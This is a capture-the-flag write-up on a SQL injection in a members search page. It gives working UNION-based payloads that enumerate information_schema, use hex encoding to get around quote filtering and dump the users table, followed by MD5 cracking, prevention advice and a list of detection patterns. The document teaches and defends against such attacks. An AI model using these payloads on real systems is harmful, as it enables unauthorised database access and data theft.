# Member SQL Injection

## Summary

This breach is located in the members search page.

The input is vulnerable to SQL injection because user input is inserted into a SQL query without proper sanitization or prepared statements.

By injecting SQL payloads, I was able to:

1. List all members.
2. Enumerate database tables.
3. Enumerate database columns.
4. Dump the interesting row from the `users` table.
5. Recover the final flag from a hash transformation.

Final flag:

```txt
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## How I Discovered It

I started by testing whether the members input was interpreted as part of a SQL condition.

Payload:

```sql
1 OR 1=1
```

This returned all members, which means the input changed the SQL logic.

The likely backend query was similar to:

```sql
SELECT first_name, last_name
FROM users
WHERE user_id = USER_INPUT;
```

With the injected payload, it becomes:

```sql
SELECT first_name, last_name
FROM users
WHERE user_id = 1 OR 1=1;
```

Since `1=1` is always true, the query returns all rows.

## Exploitation Steps

### 1. Confirm SQL Injection

```sql
1 OR 1=1
```

This listed all members.

### 2. List Database Tables

To enumerate available tables, I queried `information_schema.tables`:

```sql
1 UNION SELECT table_name,2 FROM information_schema.tables
```

Then I restricted the result to the current database:

```sql
1 UNION SELECT table_name,2
FROM information_schema.tables
WHERE table_schema = database()
```

Result:

```txt
First name: one
Surname : me

First name: users
Surname : 2
```

The interesting table was:

```txt
users
```

### 3. List Database Columns

To enumerate columns, I queried `information_schema.columns`:

```sql
1 UNION SELECT column_name,2 FROM information_schema.columns
```

Then I filtered by table name:

```sql
1 UNION SELECT column_name,2
FROM information_schema.columns
WHERE table_name='users'
```

Another way to filter the same table is using hex encoding:

```sql
1 UNION SELECT column_name,2
FROM information_schema.columns
WHERE table_name LIKE 0x7573657273
```

The hex value:

```txt
0x7573657273
```

means:

```txt
users
```

Using hex can help avoid quote-related filtering problems.

### 4. Dump User Data

After finding the table and columns, I dumped useful values from the `users` table:

```sql
1 UNION SELECT first_name,Commentaire FROM users
```

Then I targeted the row where `first_name` is `Flag`.

The string `Flag` can be written in hex:

```txt
0x466c6167
```

Payload:

```sql
1 UNION SELECT first_name,concat(last_name,Commentaire,countersign)
FROM users
WHERE first_name LIKE 0x466c6167
```

Result:

```txt
First name: Flag
Surname : GetTheDecrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
```

The important hash was:

```txt
5ff9d0165b4f92b14994e5c685cdce28
```

## Hash Transformation

The message says:

```txt
Decrypt this password -> then lower all the char. Sh256 on it and it's good !
```

The hash:

```txt
5ff9d0165b4f92b14994e5c685cdce28
```

is an MD5 hash.

Cracking it gives:

```txt
FortyTwo
```

Lowercase it:

```txt
fortytwo
```

Then calculate SHA256:

```bash
python3 -c 'import hashlib; print(hashlib.sha256("fortytwo".encode()).hexdigest())'
```

Result:

```txt
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

This is the flag.

## Why This Is Vulnerable

The application directly uses user input inside SQL queries.

Instead of treating the input as data, the database interprets part of the input as SQL code.

That allows an attacker to:

- bypass query conditions
- enumerate database structure
- read tables and columns
- extract sensitive data
- recover secrets or hashes

## Impact

An attacker can read arbitrary database information that the web application's database user can access.

In this case, SQL injection allowed reading the `users` table and recovering the flag.

In a real application, this could expose users, password hashes, emails, private data, or administrative information.

## How To Prevent It

Recommended fixes:

- Use prepared statements / parameterized queries.
- Never concatenate raw user input into SQL.
- Validate numeric parameters server-side.
- Use least-privilege database accounts.
- Do not expose detailed SQL errors to users.
- Hash passwords with strong password hashing algorithms such as bcrypt or Argon2, not MD5.
- Monitor suspicious SQL patterns such as `UNION SELECT`, `OR 1=1`, and access to `information_schema`.

Example safe pattern:

```php
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$userId]);
```

The main lesson is:

```txt
User input must be treated as data, never as executable SQL.
```
